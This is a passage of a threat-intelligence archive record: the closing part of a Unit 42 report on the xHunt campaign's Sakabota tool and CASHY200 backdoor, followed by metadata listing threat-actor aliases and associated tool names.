(SHA256:\n\nffe2e9b274b00ea967c96eca9c177048c35de75599488f1b8be5ae1cceba00d9) installs a\nPowerShell based backdoor called CASHY200, which we covered in detail in a previous blog\n[regarding the xHunt campaign.](https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/)\n\n\n-----\n\nThe Web Browser tab seen in Figure 10 is rather interesting, as it does not have any buttons\nor the ability to actually browse the Internet. It is likely that this tab is an artifact of prior\nversions of Sakabota, but we are unsure why the developer would have removed the\nbrowsing functionality without removing the tab in its entirety.\n\n_Figure 10. Sakabota’s unsupported web browser tab_\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-04 - xHunt Campaign- xHunt Actor’s Cheat Sheet.pdf"
    ],
    "report_names": [
        "2019-12-04 - xHunt Campaign- xHunt Actor’s Cheat Sheet.pdf"
    ],
    "threat_actors": [
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535660,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1653698149,
    "ts_modification_date": 1653698149,
    "files": {
        "pdf": "https://archive.orkl.eu/daeefcde600de47f74f233a52e19afbd65e05b22.pdf",
        "text": "https://archive.orkl.eu/daeefcde600de47f74f233a52e19afbd65e05b22.txt",
        "img": "https://archive.orkl.eu/daeefcde600de47f74f233a52e19afbd65e05b22.jpg"
    }
}